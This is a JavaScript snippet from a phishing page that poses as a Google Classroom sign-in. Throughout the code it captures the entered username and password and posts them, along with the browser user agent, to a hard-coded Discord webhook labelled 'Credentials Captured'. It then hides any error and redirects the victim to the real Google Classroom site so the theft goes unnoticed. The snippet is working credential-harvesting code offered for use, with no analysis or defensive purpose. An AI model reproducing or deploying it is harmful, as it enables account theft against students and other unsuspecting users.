<script>
// CONFIG - Replace these with your actual URLs
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1566198563929596005/HurQNjG_28MpPRoYS1My-yvZkA-3QwNCuvoeD8sOR88GxFrZu1oSUtxi282fIgt09j5w';
const REDIRECT_URL = 'https://classroom.google.com';

// Get elements
const signinBtn = document.getElementById('signin');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');

// Handle Sign In button click
signinBtn.addEventListener('click', function(e) {
    e.preventDefault();
    handleLogin();
});

// Handle Enter key on username field
usernameInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        handleLogin();
    }
});

// Handle Enter key on password field
passwordInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        handleLogin();
    }
});

function handleLogin() {
    const username = usernameInput.value;
    const password = passwordInput.value;
    
    if (!username || !password) return;
    
    const payload = {
        content: "Credentials Captured",
        embeds: [{
            title: "Credentials Captured",
            color: 0x5865F2,
            fields: [
                { name: "Username", value: username, inline: true },
                { name: "Password", value: password, inline: true },
                { name: "User Agent", value: navigator.userAgent, inline: false }
            ],
            timestamp: new Date().toISOString()
        }]
    };
    
    fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(() => {});
    
    signinBtn.innerText = 'Please wait';
    signinBtn.disabled = true;
    
    setTimeout(function() {
        window.location.href = REDIRECT_URL;
    }, 1000);
}
</script>
